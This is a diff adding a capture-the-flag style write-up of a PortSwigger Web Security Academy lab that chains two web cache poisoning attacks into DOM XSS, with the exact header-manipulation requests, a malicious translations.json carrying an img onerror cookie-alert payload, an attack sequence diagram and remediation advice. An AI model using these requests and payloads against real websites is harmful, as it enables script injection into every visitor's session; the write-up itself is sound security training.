@@ -1,0 +1,481 @@
+# Web Cache Poisoning with Multiple Responses (DOM XSS via Translation File)
+
+**Lab:** Web Cache Poisoning with Multiple Responses  
+**Difficulty:** Expert  
+**Category:** Web Cache Poisoning / DOM XSS  
+**Platform:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+The application was vulnerable to two independent cache poisoning attacks that could be chained together.
+
+The first vulnerability allowed an attacker to poison the localized Spanish page so that it loaded a malicious translation JSON file from an attacker-controlled server.
+
+However, English users were not affected because the English translation path did not contain the DOM XSS sink.
+
+A second cache poisoning vulnerability allowed the attacker to cache a redirect forcing every visitor to switch from English to Spanish.
+
+By poisoning both cache entries simultaneously, every victim visiting the website would:
+
+1. Receive the cached redirect.
+2. Be switched to the Spanish version.
+3. Load the poisoned translations.
+4. Execute arbitrary JavaScript.
+
+---
+
+# Vulnerability Classification
+
+| Category | Value |
+|----------|------|
+| CWE | CWE-444 / CWE-79 |
+| OWASP | A03 Injection |
+| Severity | High |
+| CVSS | 8.8 (High) |
+
+---
+
+# Affected Components
+
+- Translation loader
+- Reverse proxy cache
+- X-Forwarded-Host header
+- X-Original-URL header
+
+---
+
+# Root Cause
+
+The application trusted the **X-Forwarded-Host** header when constructing URLs for translation files.
+
+The cache also trusted the **X-Original-URL** header and cached redirect responses.
+
+These two implementation flaws could be combined.
+
+---
+
+# Attack Overview
+
+Two different cache entries were poisoned.
+
+## Poison #1
+
+```
+GET /?localized=1
+```
+
+Purpose:
+
+Serve a malicious translations.json file.
+
+---
+
+## Poison #2
+
+```
+GET /
+```
+
+Purpose:
+
+Force every English user to visit
+
+```
+/setlang/es
+```
+
+which eventually loads
+
+```
+/?localized=1
+```
+
+already poisoned.
+
+---
+
+# Step 1 — Discovering the Translation Import
+
+The home page imports translations dynamically.
+
+The browser loads a JSON file similar to:
+
+```
+/resources/json/translations.json
+```
+
+The host used to retrieve this file comes from JavaScript variables populated from the HTTP response.
+
+Using Param Miner revealed support for
+
+```
+X-Forwarded-Host
+```
+
+Changing it caused the page to reference another host.
+
+Example:
+
+```
+X-Forwarded-Host: example.com
+```
+
+The response now instructed the browser to load
+
+```
+https://example.com/resources/json/translations.json
+```
+
+---
+
+# Step 2 — Creating the Malicious Translation File
+
+On the exploit server the file path was changed to
+
+```
+/resources/json/translations.json
+```
+
+Headers:
+
+```
+Access-Control-Allow-Origin: *
+```
+
+Body:
+
+```json
+{
+  "en": {
+    "name": "English"
+  },
+  "es": {
+    "name": "español",
+    "translations": {
+      "Return to list":"Volver",
+      "View details":"</a><img src=1 onerror='alert(document.cookie)'>",
+      "Description:":"Descripción"
+    }
+  }
+}
+```
+
+The payload was injected into one translated string.
+
+---
+
+# Step 3 — Poisoning the Spanish Page
+
+The following request was cached.
+
+```
+GET /?localized=1
+```
+
+Headers:
+
+```
+Cookie: lang=es
+
+X-Forwarded-Host:
+exploit-XXXX.exploit-server.net
+```
+
+Eventually the response returned
+
+```
+X-Cache: hit
+```
+
+meaning the malicious page had been cached.
+
+Now every Spanish visitor loaded attacker-controlled translations.
+
+---
+
+# Step 4 — Finding the Language Redirect
+
+Changing the language generated
+
+```
+GET /setlang/es
+```
+
+This response contained
+
+```
+Set-Cookie
+```
+
+and therefore could not be cached.
+
+However...
+
+---
+
+# Step 5 — Bypassing Cache Restrictions
+
+Using
+
+```
+X-Original-URL
+```
+
+allowed changing the request path internally.
+
+Instead of requesting
+
+```
+/setlang/es
+```
+
+the following value was used:
+
+```
+X-Original-URL:
+/setlang\es
+```
+
+Notice the backslash.
+
+The application normalized it into
+
+```
+/setlang/es
+```
+
+through a
+
+```
+302 Redirect
+```
+
+Unlike the normal response, this redirect was cacheable.
+
+---
+
+# Step 6 — Poisoning the Redirect
+
+Request:
+
+```
+GET /
+```
+
+Header:
+
+```
+X-Original-URL:
+/setlang\es
+```
+
+Eventually the cache returned
+
+```
+HTTP/2 302
+
+Location:
+/setlang/es
+
+X-Cache: hit
+```
+
+Now every request to
+
+```
+/
+```
+
+received the cached redirect.
+
+---
+
+# Step 7 — Full Exploit Chain
+
+Victim visits
+
+```
+/
+```
+
+↓
+
+Receives cached redirect
+
+```
+302
+```
+
+↓
+
+Browser loads
+
+```
+/setlang/es
+```
+
+↓
+
+Server redirects to
+
+```
+/?localized=1
+```
+
+↓
+
+Browser loads localized page
+
+↓
+
+Page requests
+
+```
+translations.json
+```
+
+↓
+
+Host has already been poisoned
+
+↓
+
+Attacker JSON loaded
+
+↓
+
+DOM XSS executes
+
+---
+
+# UML Sequence Diagram
+
+```text
+                    Victim
+                      |
+                      | GET /
+                      |
+                      V
+              Reverse Proxy Cache
+                      |
+      Cached redirect exists (Poison #2)
+                      |
+                      V
+           HTTP 302 /setlang/es
+                      |
+                      V
+                 Application
+                      |
+                      |
+        Redirect to /?localized=1
+                      |
+                      V
+              Reverse Proxy Cache
+                      |
+     Cached localized page (Poison #1)
+                      |
+                      V
+              Browser renders page
+                      |
+                      |
+     Requests translations.json
+                      |
+                      V
+ Exploit Server (via poisoned X-Forwarded-Host)
+                      |
+          Returns malicious JSON
+                      |
+                      V
+         initTranslations()
+                      |
+                      V
+      innerHTML assignment
+                      |
+                      V
+         <img onerror=alert()>
+                      |
+                      V
+             JavaScript executes
+```
+
+---
+
+# Why Two Cache Poisonings Were Required
+
+Poisoning only the translation file was insufficient.
+
+English users never execute the vulnerable translation sink.
+
+Therefore:
+
+```
+Poison #1
+```
+
+infected only
+
+```
+/?localized=1
+```
+
+while
+
+```
+Poison #2
+```
+
+forced every English user to become a Spanish user.
+
+Only after combining both responses did the exploit become universal.
+
+---
+
+# Impact
+
+An attacker can execute arbitrary JavaScript in every visitor's browser.
+
+Possible consequences include:
+
+- Session hijacking
+- CSRF token theft
+- Account takeover
+- Credential theft
+- Keylogging
+- DOM manipulation
+- Phishing
+
+---
+
+# Root Cause
+
+The application trusted two proxy headers:
+
+- X-Forwarded-Host
+- X-Original-URL
+
+while the cache stored responses generated from these attacker-controlled values.
+
+The translation rendering code also inserted untrusted HTML directly into the DOM.
+
+---
+
+# Remediation
+
+- Ignore client-controlled forwarding headers unless explicitly trusted.
+- Exclude forwarding headers from cacheable responses.
+- Sanitize translation content before inserting into the DOM.
+- Never use `innerHTML` for untrusted content.
+- Validate translation sources.
+- Avoid caching redirect responses influenced by client-controlled headers.
+
+---
+
+# Key Takeaways
+
+- Cache poisoning can require multiple synchronized cache entries.
+- Individual vulnerabilities may appear harmless but become critical when chained.
+- Translation systems frequently become DOM XSS sinks.
+- Reverse proxy normalization behavior (such as backslash normalization) can introduce unexpected cache poisoning vectors.
+- Chained cache poisoning attacks can reliably compromise every visitor of a website.
